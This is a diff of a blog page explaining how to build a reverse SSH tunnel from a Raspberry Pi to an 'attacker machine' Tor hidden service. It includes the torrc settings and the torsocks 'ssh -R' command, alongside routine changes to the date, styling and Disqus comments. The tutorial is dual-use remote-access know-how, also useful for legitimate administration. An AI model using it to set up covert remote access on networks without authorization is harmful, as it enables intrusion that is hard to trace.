@@ -378,7 +378,7 @@ window.addEventListener("load", function(){
           <div class="post-content well">
 <article class="content">
     <div class="post"><h1 id="tor-remote-reverse-ssh-tunnel">Tor Remote Reverse-SSH Tunnel</h1>
-<p><em>Last modified:</em> 17 January 2019</p>
+<p><em>Last modified:</em> 26 January 2022</p>
 
 <p>How to use TOR hidden service with SSH remote tunnel and how to use  hidden service as an anonymous SSH proxy.</p>
 
@@ -401,21 +401,21 @@ window.addEventListener("load", function(){
 <h1 id="tor-hidden-service-setup">TOR Hidden Service setup</h1>
 <p>On the attacker machine it is needed to setup a Hidden Service exposing itself to the whole TOR network. The service will expose the local ssh server needed to allow the raspi box to reverse ssh into it.</p>
 
-<p>Edit the <code class="highlighter-rouge">/etc/tor/torrc</code> file and modify these lines:</p>
+<p>Edit the <code class="language-plaintext highlighter-rouge">/etc/tor/torrc</code> file and modify these lines:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HiddenServiceDir /var/lib/tor/hidden_service/
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HiddenServiceDir /var/lib/tor/hidden_service/
 HiddenServicePort 30022 127.0.0.1:22
 </code></pre></div></div>
 <p>where 30022 is the port open to the TOR network redirecting traffic to 127.0.0.1 port 22.</p>
 
-<p>For further client authorization look at the <code class="highlighter-rouge">HiddenServiceAuthorizeClient</code> directive.</p>
+<p>For further client authorization look at the <code class="language-plaintext highlighter-rouge">HiddenServiceAuthorizeClient</code> directive.</p>
 
-<p>Then save and restart Tor. It will create the material needed to the hidden service in the <code class="highlighter-rouge">hidden_service</code> folder. The last thing you need is the hostname which will refer to the hidden service located under <code class="highlighter-rouge">/var/lib/tor/hidden_service/hostname</code>.</p>
+<p>Then save and restart Tor. It will create the material needed to the hidden service in the <code class="language-plaintext highlighter-rouge">hidden_service</code> folder. The last thing you need is the hostname which will refer to the hidden service located under <code class="language-plaintext highlighter-rouge">/var/lib/tor/hidden_service/hostname</code>.</p>
 
-<p>For example: <code class="highlighter-rouge">irpqznciwifhpqgd.onion</code></p>
+<p>For example: <code class="language-plaintext highlighter-rouge">irpqznciwifhpqgd.onion</code></p>
 
-<p>Change also the file <code class="highlighter-rouge">/etc/tor/torsocks.conf</code> the line:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AllowOutboundLocalhost 1
+<p>Change also the file <code class="language-plaintext highlighter-rouge">/etc/tor/torsocks.conf</code> the line:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AllowOutboundLocalhost 1
 </code></pre></div></div>
 <p>This is needed to torsocks</p>
 
@@ -423,14 +423,14 @@ HiddenServicePort 30022 127.0.0.1:22
 
 <ul>
   <li>Copy the RSA key to the Server with:
-    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh-copy-id -i .ssh/id_rsa.pub lobs@AttackerServer.domain
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh-copy-id -i .ssh/id_rsa.pub lobs@AttackerServer.domain
 </code></pre></div>    </div>
     <p>If id_rsa.pub doesn’t already exists then:</p>
-    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh-keygen
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh-keygen
 </code></pre></div>    </div>
   </li>
   <li>The command to launch is:
-    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ torsocks ssh -p 30022 -N -R 2222:localhost:22 pi@irpqznciwifhpqgd.onion
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ torsocks ssh -p 30022 -N -R 2222:localhost:22 pi@irpqznciwifhpqgd.onion
 </code></pre></div>    </div>
   </li>
 </ul>
@@ -447,7 +447,7 @@ HiddenServicePort 30022 127.0.0.1:22
 <ol>
   <li>SSH into his server on port 30022.</li>
   <li>Run the command:
-    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh -p 2222 -l lobs localhost
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh -p 2222 -l lobs localhost
 </code></pre></div>    </div>
   </li>
 </ol>
@@ -898,13 +898,13 @@ https://twitter.com/intent/tweet?original_referer=https://carloalbertoscola.it//
 </div>
 
 
-<!-- <div class="disqus-comments">
+<div class="disqus-comments">
     <div id="disqus_thread"></div>
     <script type="text/javascript">
         /* <![CDATA[ */
 
         var disqus_shortname = "carloalbertoscola-it";
-        var disqus_identifier = "https://carloalbertoscola.it/_TOR SSH Remote Reverse Tunnel - Raspberry Pi";
+        var disqus_identifier = "carloalbertoscola-it_TOR SSH Remote Reverse Tunnel - Raspberry Pi";
         var disqus_title = "TOR SSH Remote Reverse Tunnel - Raspberry Pi";
 
         /* * * DON'T EDIT BELOW THIS LINE * * */
@@ -915,9 +915,9 @@ https://twitter.com/intent/tweet?original_referer=https://carloalbertoscola.it//
         })();
     /* ]]> */
     </script>
-</div> -->
+</div>
 
-<div id="disqus_thread"></div>
+<!-- <div id="disqus_thread"></div>
 <script>
 
 /**
@@ -926,7 +926,7 @@ https://twitter.com/intent/tweet?original_referer=https://carloalbertoscola.it//
 
 var disqus_config = function () {
 this.page.url = "https://carloalbertoscola.it/";  // Replace PAGE_URL with your page's canonical URL variable
-this.page.identifier = "https://carloalbertoscola.it/_TOR SSH Remote Reverse Tunnel - Raspberry Pi"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+this.page.identifier = "carloalbertoscola-it_TOR SSH Remote Reverse Tunnel - Raspberry Pi"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
 };
 
 (function() { // DON'T EDIT BELOW THIS LINE
@@ -939,7 +939,9 @@ s.setAttribute('data-timestamp', +new Date());
 <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
 
 </div>
+-->
 
+<script id="dsq-count-scr" src="//carloalbertoscola-it.disqus.com/count.js" async></script> 
           <div class="row">
             <div class="col-md-12 col-xs-12 footer">
               <footer>
